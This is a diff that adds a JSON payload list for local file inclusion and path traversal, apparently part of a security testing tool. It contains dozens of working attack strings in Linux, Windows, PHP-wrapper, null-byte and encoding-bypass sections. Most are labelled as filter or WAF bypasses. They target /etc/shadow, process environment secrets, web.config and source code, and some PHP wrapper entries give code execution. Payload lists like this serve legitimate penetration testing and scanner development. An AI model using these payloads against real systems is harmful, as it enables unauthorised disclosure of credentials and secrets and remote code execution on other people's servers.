@@ -1,0 +1,75 @@
+{
+  "category": "lfi",
+  "contexts": {
+    "linux": {
+      "description": "Linux/Unix path traversal payloads targeting /etc/passwd and other sensitive files",
+      "payloads": [
+        {"payload": "../../../etc/passwd", "description": "Basic 3-level traversal to /etc/passwd", "waf_bypass": false},
+        {"payload": "../../../../../../etc/passwd", "description": "Deep 6-level traversal to /etc/passwd", "waf_bypass": false},
+        {"payload": "....//....//....//etc/passwd", "description": "Double-dot filter bypass — strips ../ once, leaves ../", "waf_bypass": true},
+        {"payload": "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "description": "URL-encoded slashes to bypass path filters", "waf_bypass": true},
+        {"payload": "..%252f..%252f..%252f..%252fetc%252fpasswd", "description": "Double URL-encoded slashes for WAF bypass", "waf_bypass": true},
+        {"payload": "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "description": "URL-encoded dots with literal slashes", "waf_bypass": true},
+        {"payload": "..%c0%af..%c0%af..%c0%afetc/passwd", "description": "UTF-8 overlong encoding of / (IIS/Tomcat bypass)", "waf_bypass": true},
+        {"payload": "/etc/passwd", "description": "Absolute path — works if app prepends no base directory", "waf_bypass": false},
+        {"payload": "../../../../../../etc/shadow", "description": "Shadow file — readable if running as root", "waf_bypass": false},
+        {"payload": "../../../../../../proc/self/environ", "description": "Process environment variables — may contain secrets", "waf_bypass": false},
+        {"payload": "../../../../../../proc/self/cmdline", "description": "Process command line — reveals running application", "waf_bypass": false},
+        {"payload": "/etc/passwd%00.png", "description": "Null byte extension bypass (PHP < 5.3.4)", "waf_bypass": true}
+      ]
+    },
+    "windows": {
+      "description": "Windows path traversal payloads targeting win.ini and other system files",
+      "payloads": [
+        {"payload": "..\\..\\..\\..\\windows\\win.ini", "description": "Basic backslash traversal to win.ini", "waf_bypass": false},
+        {"payload": "../../../../../../windows/win.ini", "description": "Forward slash traversal (works on Windows too)", "waf_bypass": false},
+        {"payload": "..%5c..%5c..%5c..%5cwindows%5cwin.ini", "description": "URL-encoded backslash traversal", "waf_bypass": true},
+        {"payload": "..%255c..%255c..%255cwindows%255cwin.ini", "description": "Double URL-encoded backslash", "waf_bypass": true},
+        {"payload": "..%c1%9c..%c1%9c..%c1%9cwindows/win.ini", "description": "UTF-8 overlong backslash (IIS bypass)", "waf_bypass": true},
+        {"payload": "....\\\\....\\\\....\\\\windows\\\\win.ini", "description": "Double backslash filter bypass", "waf_bypass": true},
+        {"payload": "C:\\windows\\win.ini", "description": "Absolute Windows path", "waf_bypass": false},
+        {"payload": "\\\\localhost\\c$\\windows\\win.ini", "description": "UNC path to local C$ share", "waf_bypass": true},
+        {"payload": "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "description": "Windows hosts file for network config disclosure", "waf_bypass": false},
+        {"payload": "..\\..\\..\\..\\inetpub\\wwwroot\\web.config", "description": "IIS web.config — may contain connection strings and secrets", "waf_bypass": false}
+      ]
+    },
+    "php_wrappers": {
+      "description": "PHP-specific stream wrappers for file read, RCE, and information disclosure",
+      "payloads": [
+        {"payload": "php://filter/convert.base64-encode/resource=index", "description": "Base64-encode source code via php://filter (no RCE needed)", "waf_bypass": false},
+        {"payload": "php://filter/convert.base64-encode/resource=../config", "description": "Read config file as base64 via filter wrapper", "waf_bypass": false},
+        {"payload": "php://filter/read=string.rot13/resource=index", "description": "ROT13 encode source — alternative filter for WAF bypass", "waf_bypass": true},
+        {"payload": "php://input", "description": "Read from POST body — enables RCE if file is included", "waf_bypass": false},
+        {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "description": "data:// wrapper with base64 phpinfo() — RCE via include", "waf_bypass": false},
+        {"payload": "expect://id", "description": "expect:// wrapper — direct command execution (rarely enabled)", "waf_bypass": false},
+        {"payload": "phar://uploads/shell.jpg/test.php", "description": "phar:// wrapper — deserializes PHAR metadata from uploaded file", "waf_bypass": true},
+        {"payload": "php://filter/zlib.deflate/convert.base64-encode/resource=index.php", "description": "Chained filters — compress then base64 to bypass size checks", "waf_bypass": true},
+        {"payload": "zip://uploads/shell.jpg%23payload.php", "description": "zip:// wrapper — extract PHP from ZIP disguised as image", "waf_bypass": true},
+        {"payload": "php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php", "description": "iconv filter chain — alternative encoding to bypass filters", "waf_bypass": true}
+      ]
+    },
+    "null_byte": {
+      "description": "Null byte injection to truncate file extension appended by application (PHP < 5.3.4, old Java)",
+      "payloads": [
+        {"payload": "../../../etc/passwd%00", "description": "Null byte truncation — strips appended extension", "waf_bypass": true},
+        {"payload": "../../../etc/passwd%00.php", "description": "Null byte before forced .php extension", "waf_bypass": true},
+        {"payload": "../../../etc/passwd%2500", "description": "Double-encoded null byte for WAF bypass", "waf_bypass": true},
+        {"payload": "../../../etc/passwd\\0.jpg", "description": "Literal null byte with image extension", "waf_bypass": true},
+        {"payload": "../../../../../../etc/passwd%00%00%00%00", "description": "Multiple null bytes for padding-based truncation", "waf_bypass": true}
+      ]
+    },
+    "encoding_bypass": {
+      "description": "Advanced encoding and normalization tricks to bypass LFI filters and WAFs",
+      "payloads": [
+        {"payload": "....//....//....//....//etc/passwd", "description": "Double-dot double-slash — survives single ../ strip", "waf_bypass": true},
+        {"payload": "..././..././..././etc/passwd", "description": "Nested traversal — after stripping ../ leaves ../", "waf_bypass": true},
+        {"payload": "..;/..;/..;/..;/etc/passwd", "description": "Semicolon path parameter bypass (Tomcat/Jetty)", "waf_bypass": true},
+        {"payload": "..%u2215..%u2215..%u2215etc/passwd", "description": "Unicode fraction slash (U+2215) as path separator", "waf_bypass": true},
+        {"payload": "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "description": "Unicode fullwidth solidus (U+FF0F) as slash replacement", "waf_bypass": true},
+        {"payload": "..%e0%80%af..%e0%80%af..%e0%80%afetc/passwd", "description": "UTF-8 overlong 3-byte encoding of slash", "waf_bypass": true},
+        {"payload": "..0x2f..0x2f..0x2fetc/passwd", "description": "Hex-encoded slash — bypasses regex-based filters", "waf_bypass": true},
+        {"payload": "....SLASH....SLASH....SLASHetc/passwd", "description": "Placeholder — replace SLASH with target-specific separator", "waf_bypass": true}
+      ]
+    }
+  }
+}
